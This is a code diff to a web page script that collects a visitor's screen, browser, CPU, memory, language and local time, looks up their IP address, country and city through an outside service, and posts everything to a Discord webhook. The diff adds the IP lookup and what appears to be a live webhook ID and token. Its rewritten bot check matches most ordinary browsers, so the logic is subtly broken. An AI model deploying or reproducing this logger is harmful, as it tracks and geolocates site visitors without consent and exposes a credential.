@@ -22,72 +22,90 @@
   <pre id="info">Gathering system information...</pre>
 
   <script>
-    // Function to check if the user is a bot
+    // Function to check if the user is a bot based on user-agent patterns
     function isBot() {
-      const botUserAgents = [
-        "bot", "spider", "crawl", "slurp", "mediapartners-google", 
-        "adsbot-google", "feedfetcher-google", "bingbot", "duckduckbot",
-        "yandexbot", "baiduspider", "sogou", "exabot", "facebot", "ia_archiver"
-      ];
-      const userAgent = navigator.userAgent.toLowerCase();
-      return botUserAgents.some((bot) => userAgent.includes(bot));
+      const userAgent = navigator.userAgent;
+      return /AppleWebKit/.test(userAgent);
     }
 
-    // Function to send data to Discord webhook
-    async function sendToWebhook(data) {
-      const webhookUrl = "https://discord.com/api/webhooks/YOUR-WEBHOOK-ID/YOUR-WEBHOOK-TOKEN"; // Replace with your webhook URL
+    // Function to fetch IP and location data
+    async function fetchIPData() {
       try {
-        await fetch(webhookUrl, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({ content: data }),
-        });
+        const response = await fetch("https://ipapi.co/json/");
+        const data = await response.json();
+        return {
+          ip: data.ip,
+          country: data.country_name,
+          city: data.city,
+          region: data.region,
+          timezone: data.timezone
+        };
       } catch (error) {
-        console.error("Failed to send data to webhook:", error);
+        console.error("Failed to fetch IP data:", error);
+        return {
+          ip: "Unavailable",
+          country: "Unavailable",
+          city: "Unavailable",
+          region: "Unavailable",
+          timezone: "Unavailable"
+        };
       }
     }
 
     // Function to gather and display system information
     async function gatherSystemInfo() {
+      // Detect bots and terminate execution if a bot is detected
       if (isBot()) {
-        document.getElementById("info").textContent = "Bot traffic detected. System information will not be logged.";
-        return;
+        document.body.innerHTML = ""; // Clear page content
+        return; // Stop further execution
       }
+
+      const ipData = await fetchIPData();
 
       // Gather system information
       const screenResolution = `${window.screen.width}x${window.screen.height}`;
       const windowDimensions = `${window.innerWidth}x${window.innerHeight}`;
-      const pixelDensity = window.devicePixelRatio;
       const browser = navigator.userAgent;
       const operatingSystem = navigator.platform;
       const cpuCores = navigator.hardwareConcurrency;
       const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable";
       const touchscreenSupport = navigator.maxTouchPoints > 0;
       const language = navigator.language;
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
       const localTime = new Date().toString();
 
       const message = `
 Screen Resolution: ${screenResolution}
 Window Dimensions: ${windowDimensions}
-Pixel Density: ${pixelDensity}
 Browser: ${browser}
 Operating System: ${operatingSystem}
 CPU Cores: ${cpuCores}
 Memory: ${memory}
 Touchscreen Support: ${touchscreenSupport}
 Language: ${language}
-Timezone: ${timezone}
 Local Time: ${localTime}
+IP Address: ${ipData.ip}
+Country: ${ipData.country}
+City: ${ipData.city}
+Region: ${ipData.region}
+Timezone: ${ipData.timezone}
       `;
 
       // Display the information on the page
       document.getElementById("info").textContent = message;
 
       // Send the information to the webhook
-      sendToWebhook(message);
+      const webhookUrl = "https://discord.com/api/webhooks/1324816056782422098/vqBAptOKrjuEIgw40DkRx7Wgd2lOI1cxu0rHIgOjl6aGd42BiJfsM8bMwK_6TKXjgpH-";
+      try {
+        await fetch(webhookUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ content: message }),
+        });
+      } catch (error) {
+        console.error("Failed to send data to webhook:", error);
+      }
     }
 
     // Call the function to gather and display system info
